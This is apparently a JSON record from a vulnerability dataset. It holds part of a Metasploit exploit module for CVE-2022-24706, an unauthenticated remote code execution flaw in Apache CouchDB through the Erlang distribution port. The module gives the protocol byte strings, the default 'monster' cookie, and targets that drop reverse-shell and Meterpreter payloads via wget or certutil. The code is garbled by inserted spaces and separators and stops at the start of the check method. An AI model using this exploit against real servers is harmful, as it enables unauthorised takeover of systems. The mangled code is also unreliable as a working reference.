{
    "text": "vul_name : Apache CouchDB Erlang Remote Code Execution ， vul_cve : CVE-2022-24706 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : CmdStager ， include Msf : Exploit : Retry ， include Msf : Exploit : Powershell ， prepend Msf : Exploit : Remote : AutoCheck ， require 'msf/core/exploit/powershell' ， require 'digest' ，  # Constants required for communicating over the Erlang protocol defined here :  ， EPM_NAME_CMD = \"\\x00\\x01\\x6e\".freeze ， NAME_MSG = \"\\x00\\x15n\\x00\\x07\\x00\\x03\\x49\\x9cAAAAAA @ AAAAAAA\".freeze ， CHALLENGE_REPLY = \"\\x00\\x15r\\x01\\x02\\x03\\x04\".freeze ， CTRL_DATA = \"\\x83h\\x04a\\x06gw\\x0eAAAAAA @ AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00w\\x00w\\x03rex\".freeze ， COOKIE = 'monster'.freeze ， COMMAND_PREFIX = \"\\x83h\\x02gw\\x0eAAAAAA @ AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00h\\x05w\\x04callw\\x02osw\\x03cmdl\\x00\\x00\\x00\\x01k\".freeze ， super (  ， update_info (  ， info ,  ， 'Name' => 'Apache Couchdb Erlang RCE' ,  ， 'Description' => %q{ ， In Apache CouchDB prior to 3.2.2 , an attacker can access an improperly secured default installation without ， authenticating and gain admin privileges. ， } ,  ， 'Author' => [  ， 'Milton Valencia ( wetw0rk ) ' ,  # Erlang Cookie RCE discovery ， '1F98D' ,  # Erlang Cookie RCE exploit ， 'Konstantin Burov' ,  # Apache CouchDB Erlang Cookie exploit ， '_sadshade' ,  # Apache CouchDB Erlang Cookie exploit ， 'jheysel-r7' ,  # Msf Module ，  ]  ,  ， ' ，  [ 'EDB' , '49418' ]  ,  ，  [ 'URL' , ' ，  [ 'CVE' , '2022-24706' ]  ,  ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'win' , 'linux' ]  ,  ， 'Payload' => { ， 'MaxSize' => 60000 # Due to the 16-bit nature of the cmd in the compile_cmd method ， } ,  ， 'Privileged' => false ,  ， 'Arch' => [ ARCH_CMD ]  ,  ， 'Targets' => [  ，  [  ， 'Unix Command' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : unix_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/unix/reverse_openssl' ， } ， } ，  ]  ,  ，  [  ， 'Linux Dropper' ,  ， { ， 'Platform' => 'linux' ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : linux_dropper ,  ， 'CmdStagerFlavor' => : wget ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp' ， } ， } ，  ]  ,  ，  [  ， 'Windows Command' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_CMD ,  ， 'Type' => : win_cmd ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' ， } ， } ，  ]  ,  ，  [  ， 'Windows Dropper' ,  ， { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : win_dropper ,  ， 'CmdStagerFlavor' => : certutil ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp' ， } ， } ，  ]  ,  ，  [  ， 'PowerShell Stager' ,  ， { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Type' => : psh_stager ,  ， 'CmdStagerFlavor' => : certutil ,  ， 'DefaultOptions' => { ， 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' ， } ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => '2022-01-21' ,  ， 'Notes' => { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ,  ， 'SideEffects' => [ IOC_IN_LOGS , ARTIFACTS_ON_DISK ]  ， } ， register_options (  ，  [  ， Opt : RPORT ( 4369 )  ，  ]  ， end ， def check ， erlang_ports = get_erlang_ports ，  # If get_erlang_ports does not return an array of port numbers , the target is not vulnerable.",
    "time": "2022.11.02"
}